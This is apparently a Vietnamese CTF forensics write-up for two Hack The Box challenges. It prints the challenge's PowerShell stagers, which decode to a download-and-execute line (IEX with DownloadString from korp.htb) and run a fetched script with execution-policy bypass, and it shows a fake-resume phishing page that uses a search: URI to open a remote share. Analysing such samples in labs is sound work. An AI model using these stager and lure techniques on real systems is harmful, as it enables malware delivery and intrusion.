![image](https://github.com/user-attachments/assets/94a89594-6f36-4233-9bcf-da33d5406dc2)

# _Thorin’s Amulet_ _(FORSENSICS)_

![image](https://github.com/user-attachments/assets/1f8fd6b4-c229-4ca2-aa4e-ce5120d5db9e)

Nhận được file ps1

```powershell
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
}
qt4PO
```

Decode base64 nhận được 1 đường link, thử truy dùng port để truy cập nhưng kh đc

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")
```

Đọc kĩ lại mô tả thì thấy có NOTE

> Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service.

Mình dùng kali để add IP và domain vào /etc/host/

![image](https://github.com/user-attachments/assets/639b3022-3acc-40ac-be10-345154933c52)

Truy cập thử, thì nhận được file ps1 tiếp

```powershell
function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}
aqFVaq
```

Lệnh trên thực hiện tải file ps1 và chạy với lệnh Bypass, muốn xem file có gì thì mình dùng curl kết hợp với KEY xác thực

![image](https://github.com/user-attachments/assets/f404de2a-bac1-4d15-a224-45825120d93a)

Decode là nhận được flag

```
HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}
```

# _A new hire_ _(FORSENSICS)_

![image](https://github.com/user-attachments/assets/e9725ec1-0825-45f3-b533-a3cb000b9160)

Tiếp tục là file email.eml, mình mở bằng Notepad 

![image](https://github.com/user-attachments/assets/291d60c8-f0a1-41fa-860e-fcc4ffbf43ca)

Hmm khá giống với thử thách trước, add IP và domain vô /etc/hosts/

Truy cập http://storage.microsoftcloudservices.com:[PORT]//index.php

![image](https://github.com/user-attachments/assets/05a439ab-318b-4540-b8f9-47677819ce09)

Xem source, chú ý đến đoạn sau

```html
<body>
<div id="loading" class="loading-screen">Loading, please wait...</div>
  
  <div class="background">
    <div class="resume-preview">
      <h1>John Doe</h1>
      <p>Software Engineer | Web Developer | UI/UX Designer</p>
      
      <h2>Professional Experience</h2>
      <h3>Senior Software Engineer - Tech Corp</h3>
      <p>Led development of scalable web applications using modern technologies...</p>
      
      <h2>Education</h2>
      <p>B.S. Computer Science - University of Technology</p>
      
      <h2>Skills</h2>
      <p>JavaScript, React, Node.js, Python, AWS, Docker...</p>
      
      <h2>Projects</h2>
      <p>E-commerce Platform: Developed full-stack solution...</p>
      
      <h2>Contact</h2>
      <p>Email: john.doe@email.com</p>
      <p>LinkedIn: linkedin.com/in/johndoe</p>
    </div>
  </div>
  
  <div class="blur-overlay">
    <button class="view-button" onclick="getResume()">View Full Resume</button>
  </div>



  <script defer="defer">
    setTimeout(() => {
      document.getElementById('loading').style.display = 'none';
      document.getElementById('main-content').style.display = 'flex';
    }, 5000);

    function getResume() {
      window.location.href=`search:displayname=Downloads&subquery=\\\\${window.location.hostname}@${window.location.port}\\3fe1690d955e8fd2a0b282501570e1f4\\resumes\\`;
    }
  </script>
</body>
```
